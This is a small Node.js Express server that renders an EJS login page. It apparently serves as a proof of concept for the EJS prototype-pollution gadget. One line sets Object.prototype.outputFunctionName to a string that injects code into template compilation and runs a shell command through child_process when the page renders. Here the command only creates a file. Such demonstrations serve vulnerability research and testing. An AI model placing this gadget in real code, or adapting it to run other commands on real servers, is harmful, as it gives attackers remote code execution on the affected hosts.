const express = require('express')
const app = express()

app.set('views', './views')
app.set('view engine', 'ejs')

Object.prototype.outputFunctionName = "_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"touch a.txt\"');var __tmp2"

app.all('/', async function(req,res,next){
    
    res.render('login_register',{
        title:" storeHtml | logins ",
        buttonHintF:"登 录",
        buttonHintS:"没有账号?",
        hint:"登录",
        next:"/register"
    });
});

var server = app.listen(3000, function() {
    console.log('Listening on port %d', server.address().port);
});